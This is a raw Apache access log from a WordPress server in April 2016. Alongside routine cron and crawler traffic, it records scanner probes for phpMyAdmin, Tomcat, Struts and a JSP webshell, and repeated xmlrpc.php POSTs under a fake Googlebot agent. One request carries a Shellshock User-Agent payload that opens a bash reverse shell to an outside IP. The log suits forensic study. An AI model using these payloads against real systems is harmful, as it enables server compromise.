181.177.20.15 - - [20/Apr/2016:07:23:02 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 482 "-" "-"
181.177.20.15 - - [20/Apr/2016:07:23:06 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 475 "-" "-"
181.177.20.15 - - [20/Apr/2016:07:23:06 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 479 "-" "-"
119.9.25.204 - - [20/Apr/2016:10:28:45 +0000] "GET /zecmd/zecmd.jsp?comment=id HTTP/1.0" 404 499 "-" "-"
222.85.138.75 - - [20/Apr/2016:13:55:47 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 200 15639 "-" "Java/1.7.0_80"
222.85.138.75 - - [20/Apr/2016:13:55:48 +0000] "\x16\x03\x01" 400 0 "-" "-"
202.107.195.200 - - [20/Apr/2016:15:03:33 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
74.91.18.42 - - [20/Apr/2016:17:12:47 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
52.31.166.88 - - [20/Apr/2016:17:12:47 +0000] "POST /wp-cron.php?doing_wp_cron=1461172367.2925550937652587890625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
69.30.226.101 - - [20/Apr/2016:18:27:07 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 495 "-" "ZmEu"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 482 "-" "ZmEu"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 482 "-" "ZmEu"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 475 "-" "ZmEu"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 479 "-" "ZmEu"
40.68.211.62 - - [20/Apr/2016:19:30:42 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 479 "-" "ZmEu"
69.30.202.117 - - [20/Apr/2016:22:21:06 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
127.0.0.1 - - [20/Apr/2016:23:09:42 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:02:09:34 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [21/Apr/2016:02:09:34 +0000] "POST /wp-cron.php?doing_wp_cron=1461204574.8473689556121826171875 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [21/Apr/2016:05:08:52 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
169.54.233.123 - - [21/Apr/2016:06:08:25 +0000] "GET / HTTP/1.0" 200 15577 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:07:28:03 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:07:29:02 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:08:09:18 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
181.196.25.244 - - [21/Apr/2016:08:37:07 +0000] "HEAD / HTTP/1.0" 200 227 "-" "-"
222.85.138.75 - coolmoon1202 [21/Apr/2016:08:47:26 +0000] "HEAD http://www.sina.com.cn HTTP/1.1" 301 278 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
222.85.138.75 - - [21/Apr/2016:08:47:27 +0000] "HEAD http://www.sina.com.cnhttp/www.sina.com.cn/ HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
127.0.0.1 - - [21/Apr/2016:11:08:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
180.97.106.162 - - [21/Apr/2016:12:57:54 +0000] "GET /struts/utils.js HTTP/1.1" 404 450 "-" "-"
127.0.0.1 - - [21/Apr/2016:14:08:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [21/Apr/2016:14:08:54 +0000] "POST /wp-cron.php?doing_wp_cron=1461247734.2126369476318359375000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [21/Apr/2016:17:08:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
180.97.106.36 - - [21/Apr/2016:17:35:35 +0000] "GET http://www.baidu.com/robots.txt HTTP/1.1" 404 446 "-" "-"
185.25.151.159 - - [21/Apr/2016:19:15:55 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [21/Apr/2016:19:34:52 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:20:09:04 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:20:10:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:23:08:33 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [21/Apr/2016:23:09:25 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
169.229.3.91 - - [22/Apr/2016:08:32:41 +0000] "\xf8\xe0\x10\x9c\x07\x1f\xefc\xc1!8\xf1\x93U\x97@\x9e\xcd\x0f\xde\xa6\xb7\xa8B\xfc/\x17\xa8\xda\xff&\xbb\x80\xa0Y\xc1\xbe\xe4L\xa8\x10\x07\xe1\x96J" 200 15327 "-" "-"
52.31.166.88 - - [22/Apr/2016:08:32:41 +0000] "POST /wp-cron.php?doing_wp_cron=1461313961.4590740203857421875000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
74.91.18.42 - - [22/Apr/2016:13:50:47 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
52.31.166.88 - - [22/Apr/2016:13:50:47 +0000] "POST /wp-cron.php?doing_wp_cron=1461333047.3015079498291015625000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
210.72.142.101 - - [22/Apr/2016:18:07:48 +0000] "GET /cgi-bin/test-cgi HTTP/1.0" 404 500 "-" "() { :; }; /bin/bash -i >& /dev/tcp/65.49.37.71/2311 0<&1 2>&1"
89.248.160.136 - - [23/Apr/2016:03:49:13 +0000] "GET /xmlrpc.php" 200 42 "-" "-"
52.31.166.88 - - [23/Apr/2016:03:49:13 +0000] "POST /wp-cron.php?doing_wp_cron=1461383353.8665730953216552734375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
141.212.122.161 - - [23/Apr/2016:04:26:06 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.161 - - [23/Apr/2016:04:26:06 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
188.138.56.180 - - [23/Apr/2016:05:34:08 +0000] "POST /xmlrpc.php HTTP/1.0" 200 629 "-" "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0"
222.186.34.155 - - [23/Apr/2016:05:34:09 +0000] "GET https://m.baidu.com/ HTTP/1.1" 301 290 "-" "HttpClient"
89.248.160.136 - - [23/Apr/2016:07:09:49 +0000] "GET /xmlrpc.php HTTP/1.1" 200 231 "-" "libwww-perl/6.08"
89.248.160.136 - - [23/Apr/2016:07:09:49 +0000] "HEAD /xmlrpc.php HTTP/1.1" 200 169 "-" "LWP::Simple/6.00 libwww-perl/6.08"
89.248.160.136 - - [23/Apr/2016:07:09:49 +0000] "HEAD /?feed=rss2 HTTP/1.1" 200 300 "-" "LWP::Simple/6.00 libwww-perl/6.08"
89.248.160.136 - - [23/Apr/2016:07:09:49 +0000] "GET /?feed=rss2 HTTP/1.1" 200 9501 "-" "LWP::Simple/6.00 libwww-perl/6.08"
89.248.160.136 - - [23/Apr/2016:08:04:04 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:29 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:30 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:31 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:32 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:33 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:34 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:04:35 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:22 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:21 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:23 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:24 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:25 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:26 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:27 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:28 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:29 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:30 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:05:31 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:05:42 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:05:32 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:05:43 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:05:33 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:05:44 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:09:47 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:48 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:50 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:51 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:52 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:53 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:54 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:55 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:56 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:57 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:58 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:09:59 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:00 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:01 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:02 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:03 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:04 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:05 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:06 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:08 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:09 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
89.248.160.136 - - [23/Apr/2016:08:10:10 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:21 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:11 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:22 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:12 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:24 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:14 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:26 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:15 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:27 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:18 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:29 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.248.160.136 - - [23/Apr/2016:08:10:19 +0000] "POST /xmlrpc.php HTTP/1.0" 200 596 "-" "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"
::1 - - [23/Apr/2016:08:10:30 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
69.197.185.18 - - [23/Apr/2016:11:53:42 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
222.85.138.75 - coolmoon1202 [23/Apr/2016:12:51:16 +0000] "HEAD http://www.sina.com.cn HTTP/1.1" 301 278 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
222.85.138.75 - - [23/Apr/2016:12:51:17 +0000] "HEAD http://www.sina.com.cnhttp/www.sina.com.cn/ HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
52.31.166.88 - - [23/Apr/2016:12:51:16 +0000] "POST /wp-cron.php?doing_wp_cron=1461415876.6368570327758789062500 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
52.31.166.88 - - [23/Apr/2016:18:09:27 +0000] "POST /wp-cron.php?doing_wp_cron=1461434967.2160630226135253906250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
173.208.197.252 - - [23/Apr/2016:18:09:27 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
74.91.23.109 - - [23/Apr/2016:21:54:57 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [24/Apr/2016:00:50:02 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [24/Apr/2016:05:05:16 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
52.31.166.88 - - [24/Apr/2016:05:05:16 +0000] "POST /wp-cron.php?doing_wp_cron=1461474316.4239909648895263671875 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
50.87.248.84 - - [24/Apr/2016:14:12:50 +0000] "HEAD / HTTP/1.0" 200 227 "-" "-"
52.31.166.88 - - [24/Apr/2016:14:12:50 +0000] "POST /wp-cron.php?doing_wp_cron=1461507170.2792921066284179687500 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
74.91.17.180 - - [24/Apr/2016:16:57:55 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
107.150.46.34 - - [24/Apr/2016:17:25:05 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
127.0.0.1 - - [24/Apr/2016:18:43:29 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
141.212.122.129 - - [24/Apr/2016:19:12:43 +0000] "GET /x HTTP/1.1" 400 0 "-" "Telesphoreo"
169.54.233.125 - - [24/Apr/2016:19:48:27 +0000] "GET / HTTP/1.1" 200 15606 "-" "-"
74.91.20.195 - - [24/Apr/2016:21:03:29 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.93.185.252 - - [24/Apr/2016:23:52:45 +0000] "GET / HTTP/1.1" 200 15625 "-" "Research scan, mail networkresearch@yandex.ru"
82.220.38.188 - - [25/Apr/2016:00:31:02 +0000] "GET /zecmd/zecmd.jsp?comment=id HTTP/1.0" 404 499 "-" "-"
127.0.0.1 - - [25/Apr/2016:03:49:15 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
52.31.166.88 - - [25/Apr/2016:03:49:15 +0000] "POST /wp-cron.php?doing_wp_cron=1461556155.6501920223236083984375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
5.39.222.159 - - [25/Apr/2016:05:14:55 +0000] "GET / HTTP/1.0" 200 8100 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::1 - - [25/Apr/2016:06:43:55 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
180.250.68.154 - - [11/Apr/2016:07:07:34 +0000] "GET /user/soapCaller.bs HTTP/1.1" 404 472 "-" "Morfeus Fucking Scanner"
66.249.93.155 - - [11/Apr/2016:08:02:14 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
91.196.50.33 - - [11/Apr/2016:08:31:13 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
66.249.93.31 - - [11/Apr/2016:19:50:53 +0000] "GET /favicon.ico HTTP/1.1" 404 502 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
101.201.147.32 - - [11/Apr/2016:20:45:47 +0000] "GET /bbs/qalist.do HTTP/1.1" 400 0 "-" "-"
54.153.33.233 - - [11/Apr/2016:22:21:10 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
52.31.166.88 - - [11/Apr/2016:22:21:10 +0000] "POST /wp-cron.php?doing_wp_cron=1460413270.0328168869018554687500 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
125.64.94.200 - - [12/Apr/2016:00:14:06 +0000] "GET / HTTP/1.0" 200 15577 "-" "-"
185.25.151.159 - - [12/Apr/2016:01:07:11 +0000] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 458 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
